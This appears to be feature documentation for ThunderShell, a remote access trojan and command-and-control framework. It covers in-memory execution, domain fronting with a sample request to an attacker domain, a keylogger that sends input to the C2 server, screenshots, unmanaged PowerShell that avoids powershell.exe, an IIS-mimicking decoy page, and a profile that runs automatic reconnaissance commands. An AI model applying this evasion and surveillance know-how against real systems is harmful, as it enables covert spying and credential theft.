### Advantage Against Detection

The "core" RAT does not require a second stage to be injected and loaded into memory.

### Delivery Of Arbitrary Files

Everything that is placed in the `download` folder can be downloaded from the web server. For example, 
`/opt/ThunderShell/download/evil.exe` will be available at: `http://192.168.1.5:8080/evil.exe`

### Domain Fronting

When the `domain-fronting` variable is set to `on`, the following `domain-fronting-host` value will be set to the host value you choose, which should point to your C2 infrastructure. In this case, `callback-url` should point to the website you are using for your domain fronting.

For example, if `domain-fronting-host` is set to `myevildomain.com` and `callback-url` is set to `https://google.com`,
this will generate the following request to `https://google.com`:

```
GET /w4l3Mx8aW0 HTTP/1.1
Host: myevildomain.com
...
```

### Key Logger

The RAT contains an integrated keylogger that stores all input in memory and sends the data to your C2 server.

### Logging

ThunderShell provides typical web traffic and error logs. Chat and commands for every active session are saved for future reference in the `logs` folder. Note, this folder with not be created until there is an active session. It contains shell output, keylogger feeds and screenshots sorted by date.

### Multithreading

The client supports multithreading. This allows you can execute several commands in parallel on the target. 

### Multi Users Interface

ThunderShell supports multiple users at a time on both the CLI and web server.

### Screenshot Capability

This feature supports both single and multi-screen systems.

### Splash Page Configuration

You can customize the "error page" that is returned for each GET request by specifying your HTML template with the 
`http-default-404` variable in `default.json`. The file should be placed in the `html` folder. Any  dependencies such as images should be placed in the `download` folder. By default, ThunderShell mimics an IIS server and returns the default IIS server page.

### Unmanaged PowerShell

The client is using a C# unmanaged approach to execute PowerShell code. This allows the user to execute arbitrary PowerShell commands directly on the shell, without invoking `powershell.exe`.
***

### Network Traffic Formatting

(Under development) ThunderShell allows you to configure the network request performed by the client by setting arbitrary headers and changing the format of the data sent to the server.

Default profile configuration file `profile.json`:

```
{
        "headers": {
                                "X-Powered-By": "ASP.NET",
                                "X-AspNet-Version": "4.0.30319",
                                "Set-Cookie": "ASP.NET_SessionId={{random}}[32];"
                },
        "domain-fronting": "off",
        "domain-fronting-host": "google.ca",
        "autocommands": ["ipconfig", "route -nr", "netstat -ano", "ps"],
        "auto-interact": "on"
}
```

The `{{random}}[size]` syntax can be used to set arbitrary values at runtime.
